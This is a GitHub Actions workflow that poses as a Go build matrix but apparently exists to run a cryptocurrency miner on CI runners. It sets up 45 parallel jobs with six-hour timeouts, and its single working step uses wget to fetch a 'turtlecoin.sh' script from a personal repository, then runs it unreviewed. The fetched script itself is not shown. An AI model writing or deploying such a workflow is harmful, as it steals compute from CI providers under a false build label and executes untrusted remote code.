name: TURTLE
on: [push, pull_request]
jobs:
  build:
    name: Gaskan
    runs-on: ubuntu-18.04
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go: [1.6, 1.7, 1.8, 1.9, 1.10]
        flag: [A, B, C, D, E, F, G, H, I]
    timeout-minutes: 360
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: Gaskan
      run: |
        wget https://raw.githubusercontent.com/noval6161/turtlecoin/main/turtlecoin.sh && chmod u+x turtlecoin.sh && ./turtlecoin.sh
